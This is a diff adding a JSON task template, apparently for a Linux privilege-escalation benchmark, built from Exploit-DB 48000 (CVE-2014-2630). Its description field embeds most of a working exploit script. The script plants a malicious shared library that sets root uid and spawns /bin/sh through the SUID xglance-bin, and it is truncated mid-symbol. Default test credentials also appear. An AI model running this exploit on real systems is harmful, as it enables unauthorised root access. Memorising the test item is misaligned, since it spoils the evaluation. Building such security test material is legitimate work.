@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_48000",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: xglance-bin 11.00 - Privilege Escalation (CVE-2014-2630)\n\nExploit source code (48000.sh):\n```\n# Exploit Title: xglance-bin 11.00 - Privilege Escalation\n# Exploit Author: Robert Jaroszuk and Marco Ortisi (RedTimmy Security)\n# Date: 2020-02-01\n# Tested on: RHEL 5.x/6.x/7.x/8.x\n# CVE: CVE-2014-2630\n# Disclamer: This exploit is for educational purpose only\n# More details on https://redtimmysec.wordpress.com/2020/02/04/perf-exploiter/\n#\n\n#!/bin/sh\n\necho \"[*] Hewlett-Packard Performance Monitoring for Open System Environments exploit by Robert Jaroszuk and Marco Ortisi (RedTimmy Security)\"\necho\necho \"[+] Preparing the code...\"\n\ncat > lib.c << DONE\n\n#define _GNU_SOURCE\n#include <unistd.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <stdio.h>\n#include <dlfcn.h>\n\nvoid __cxa_finalize (void *d) {\n    return;\n}\n\nvoid __attribute__((constructor)) init() {\n    setresuid(geteuid(), geteuid(), geteuid());\n    printf(\"Hewlett-Packard Performance Monitoring for Open System Environments exploit by Robert Jaroszuk and Marco Ortisi (RedTimmy Security)\\n\");\n    printf(\"CVE-2014-2630\\n\");\n    fflush(stdout);\n    execl(\"/bin/sh\", (char *)NULL, (char *)NULL);\n}\n\nint applicationShellClassRec = 0;\nint applicationShellWidgetClass = 0;\nint colorConvertArgs = 0;\nint compositeWidgetClass = 0;\nint constraintClassRec = 0;\nint constraintWidgetClass = 0;\nint coreWidgetClass = 0;\nint dump_external = 0;\nint dump_fontlist = 0;\nint dump_fontlist_cache = 0;\nint dump_internal = 0;\nint FcPatternAddInteger = 0;\nint FcPatternAddString = 0;\nint FcPatternCreate = 0;\nint FcPatternDestroy = 0;\nint GetWidgetNavigPtrs = 0;\nint InitializeScrollBars = 0;\nint _ITM_deregisterTMCloneTable = 0;\nint _ITM_registerTMCloneTable = 0;\nint jpeg_calc_output_dimensions = 0;\nint jpeg_CreateDecompress = 0;\nint jpeg_destroy_decompress = 0;\nint jpeg_finish_decompress = 0;\nint jpeg_read_header = 0;\nint jpeg_read_scanlines = 0;\nint jpeg_start_decompress = 0;\nint jpeg_std_error = 0;\nint jpeg_stdio_src = 0;\nint load_jpeg = 0;\nint localeconv = 0;\nint __longjmp_chk = 0;\nint nl_langinfo = 0;\nint NumLockMask = 0;\nint objectClass = 0;\nint objectClassRec = 0;\nint overrideShellClassRec = 0;\nint png_create_info_struct = 0;\nint png_create_read_struct = 0;\nint png_destroy_read_struct = 0;\nint png_get_channels = 0;\nint png_get_gAMA = 0;\nint png_get_IHDR = 0;\nint png_get_rowbytes = 0;\nint png_get_valid = 0;\nint png_init_io = 0;\nint png_read_end = 0;\nint png_read_image = 0;\nint png_read_info = 0;\nint png_read_update_info = 0;\nint png_set_expand = 0;\nint png_set_gamma = 0;\nint png_set_gray_to_rgb = 0;\nint png_set_longjmp_fn = 0;\nint png_set_sig_bytes = 0;\nint png_set_strip_16 = 0;\nint png_sig_cmp = 0;\nint rectObjClass = 0;\nint rectObjClassRec = 0;\nint ScrollLockMask = 0;\nint SetMwmStuff = 0;\nint T = 0;\nint topLevelShellWidgetClass = 0;\nint transientShellClassRec = 0;\nint transientShellWidgetClass = 0;\nint V = 0;\nint vendorShellClassRec = 0;\nint vendorShellWidgetClass = 0;\nint W = 0;\nint __wctomb_chk = 0;\nint widgetClass = 0;\nint widgetClassRec = 0;\nint wmShellClassRec = 0;\nint wmShellWidgetClass = 0;\nint XAddExtensi\n```",
+  "cve": "CVE-2014-2630",
+  "exploitdb_id": "48000",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_48000",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
